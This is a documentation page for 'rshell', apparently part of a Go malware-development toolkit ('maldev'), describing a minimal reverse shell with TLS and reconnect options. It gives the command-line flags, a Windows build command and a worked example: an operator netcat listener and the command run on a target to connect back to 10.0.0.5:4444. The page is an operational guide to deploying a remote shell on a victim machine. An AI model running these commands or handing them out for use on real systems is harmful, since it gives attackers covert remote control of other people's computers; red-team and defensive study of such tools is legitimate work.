# `rshell`

> Minimal reverse shell over `c2/shell` + `c2/transport`.

**Source:** [`cmd/rshell/`](https://github.com/oioio-space/maldev/tree/master/cmd/rshell) · **godoc:** [pkg.go.dev/…/cmd/rshell](https://pkg.go.dev/github.com/oioio-space/maldev/cmd/rshell)
**Audience:** operator · **Platforms:** Windows + Linux

## Synopsis

```text
rshell -host <ip> -port <port> [-tls] [-retry <seconds>]
```

| Flag | Default | Meaning |
|---|---|---|
| `-host` | — | C2 listener host. |
| `-port` | — | C2 listener port. |
| `-tls` | off | Wrap the transport in TLS (uses `c2/cert` if no cert provided). |
| `-retry` | `0` | Reconnect delay in seconds (0 = no retry). |

## Build

```bash
GOOS=windows GOARCH=amd64 go build -o rshell.exe ./cmd/rshell
```

## Example

```bash
# On the operator side, any TCP listener (nc / metasploit / c2/transport server)
nc -lvnp 4444

# On target:
rshell.exe -host 10.0.0.5 -port 4444 -tls -retry 30
```

## See also

- Techniques: [`c2/transport`](../techniques/c2/transport.md), [`c2/shell`](../techniques/c2/reverse-shell.md).
